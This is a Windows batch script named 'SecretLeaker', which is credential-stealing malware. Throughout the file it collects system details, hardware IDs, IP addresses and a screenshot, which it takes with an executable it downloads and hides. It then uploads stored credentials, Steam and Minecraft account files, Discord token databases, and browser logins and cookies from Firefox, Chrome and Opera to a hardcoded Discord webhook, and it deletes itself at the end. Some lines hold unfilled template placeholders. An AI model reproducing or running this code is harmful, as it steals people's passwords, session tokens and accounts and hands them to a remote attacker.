@echo off
cls
title SecretLeaker
set webhook=https://discordapp.com/api/webhooks/1037067752281755768/Z6Jrqyw0tEtIyyWDn3j8aHkhgLrejrcDKvjeRufw8aHZz5nWECRm-pgOriJCD8W_UZXQ
set "vpath=C:\ProgramData"

cd %vpath%



for /f "tokens=2 delims==" %%J in ('wmic csproduct get uuid /value') do set hwid=%%J >nul
Find /I "%hwid%" {Location of file} > {Location of confirmation file} >nul
For /f "tokens=1,2* delims=," %%G in ({Location of confirmation file}) do set HN=%%H >nul
wmic computersystem where caption='%computername%' rename %HN%`  >nul
del {Location >nul

for /f "tokens=2 delims==" %%J in ('wmic diskdrive get serialnumber /value') do set diskdrive=%%J >nul
Find /I "%diskdrive%" {Location of file} > {Location of confirmation file} >nul
For /f "tokens=1,2* delims=," %%G in ({Location of confirmation file}) do set HN=%%H >nul
wmic computersystem where caption='%computername%' rename %HN%`  >nul
del {Location >nul

for /f "tokens=2 delims==" %%J in ('wmic baseboard get serialnumber /value') do set baseboard=%%J >nul
Find /I "%baseboard%" {Location of file} > {Location of confirmation file} >nul
For /f "tokens=1,2* delims=," %%G in ({Location of confirmation file}) do set HN=%%H >nul
wmic computersystem where caption='%computername%' rename %HN%`  >nul
del {Location >nul

for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set ip=%%a  >nul
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Opened on: `%date%` at `%time%`\nPC NAME: `%computername%`\nIP Address: `%ip%`\nHWID: `%hwid%`\nDiskDrive: `%diskdrive%`\nBaseBoard: `%baseboard%`\"}" %webhook%
timeout 5 >nul

:: GET PRIVATE IP ADDRESS
:: ----------------------
for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a

:: GET PUBLIC IP ADDRESS
:: ---------------------
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a

:: GET TIME
:: --------
for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
	set HH24=%%a
	set MI=%%b
)





:: SCREENSHOT

	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Screenshot @ %HH24%:%MI%```\"}"  %webhook%
	set "ssurl=https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true"
	IF EXIST "s.exe" GOTO waitloop3
	curl --silent -L --fail "%ssurl%" -o s.exe
	>NUL attrib "%vpath%\s.exe" +h
	:waitloop3
	IF EXIST "s.exe" GOTO waitloopend3
	timeout /t 5 /nobreak > NUL
	:waitloopend3
	2> NUL s.exe -wh 1e9060a -o s.png
	curl --silent --output /dev/null -F ss=@"%vpath%\s.png" %webhook%
	2>NUL del "%vpath%\s.png"

:: SYSTEM INFORMATION
	set "tempsys=%appdata%\sysinfo.txt"
	2>NUL SystemInfo > "%tempsys%"
	curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%
	del "%tempsys%" >nul 2>&1

:: TASK LIST

	set "temptasklist=%appdata%\tasklist.txt"
	2>NUL tasklist > "%temptasklist%"
	curl --silent --output /dev/null -F tasks=@"%temptasklist%" %webhook%
	del "%temptasklist%" >nul 2>&1

:: NET USER

	set "netuser=%appdata%\netuser.txt"
	2>NUL net user > "%netuser%"
	curl --silent --output /dev/null -F tasks=@"%netuser%" %webhook%
	del "%netuser%" >nul 2>&1

:: QUSER

	set "quser=%appdata%\quser.txt"
	2>NUL quser > "%quser%"
	curl --silent --output /dev/null -F tasks=@"%quser%" %webhook%
	del "%quser%" >nul 2>&1

:: STARTUP PROGRAMS

	set "stup=%appdata%\stup.txt"
	2>NUL reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run >> "%stup%"
	curl --silent --output /dev/null -F tasks=@"%stup%" %webhook%
	del "%stup%" >nul 2>&1

:: CMDKEY

	set "cmdkey=%appdata%\cmdkey.txt"
	2>NUL cmdkey /list > "%cmdkey%"
	curl --silent --output /dev/null -F tasks=@"%cmdkey%" %webhook%
	del "%cmdkey%" >nul 2>&1

:: IPCONFIG /ALL

	set "ipconfig=%appdata%\ipconfig.txt"
	2>NUL ipconfig /all > "%ipconfig%"
	curl --silent --output /dev/null -F tasks=@"%ipconfig%" %webhook%
	del "%ipconfig%" >nul 2>&1

:: MINECRAFT
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MINECRAFT -```\"}"  %webhook%
	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_profiles.json" %webhook%
	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_accounts.json" %webhook%
	

:: STEAM


	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- STEAM -```\"}"  %webhook%
	curl --silent --output /dev/null -F steamusers=@"C:\Program Files (x86)\Steam\config\loginusers.vdf" %webhook%
	curl --silent --output /dev/null -F loginusers=@"C:\Program Files\Steam\config\loginusers.vdf" %webhook%
for /f %%s in ('2^>NUL dir /b "C:\Program Files (x86)\Steam\"') do (
	echo %%s|find "ssfn"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F auth=@"C:\Program Files (x86)\Steam\%%s" %webhook%
		
	)
)
for /f %%s in ('2^>NUL dir /b "C:\Program Files\Steam\"') do (
	echo %%s|find "ssfn"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F auth=@"C:\Program Files\Steam\%%s" %webhook%
		
	)
)

:: DISCORD

	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- DISCORD -```\"}"  %webhook%
for /f %%f in ('2^>NUL dir /b "%appdata%\discord\Local Storage\leveldb\"') do (
	echo %%f|find ".ldb"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F level=@"%appdata%\discord\Local Storage\leveldb\%%f" %webhook%
		
	)
)

:: CHROME, FIREFOX, OPERA


	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- FIREFOX -```\"}"  %webhook%
	for /f %%f in ('2^>NUL dir /b "%appdata%\Mozilla\Firefox\Profiles"') do (
	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\logins.json" %webhook%
	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\key3.db" %webhook%
	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\key4.db" %webhook%
	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\cookies.sqlite" %webhook%
	
	)
)
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- OPERA -```\"}"  %webhook%
	curl --silent --output /dev/null -F c=@"%appdata%\Opera Software\Opera Stable\Cookies" %webhook%
	curl --silent --output /dev/null -F h=@"%appdata%\Opera Software\Opera Stable\History" %webhook%
	curl --silent --output /dev/null -F s=@"%appdata%\Opera Software\Opera Stable\Shortcuts" %webhook%
	curl --silent --output /dev/null -F b=@"%appdata%\Opera Software\Opera Stable\Bookmarks" %webhook%
	curl --silent --output /dev/null -F l=@"%appdata%\Opera Software\Opera Stable\Login Data" %webhook%

	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  %webhook%
	curl --silent --output /dev/null -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
	curl --silent --output /dev/null -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhook%
	curl --silent --output /dev/null -F s=@"%localappdata%\Google\Chrome\User Data\Default\Shortcuts" %webhook%
	curl --silent --output /dev/null -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhook%
	curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhook%
	curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%

:: self delete
start /b "" cmd /c 2^>NUL del "%~f0"&exit /b
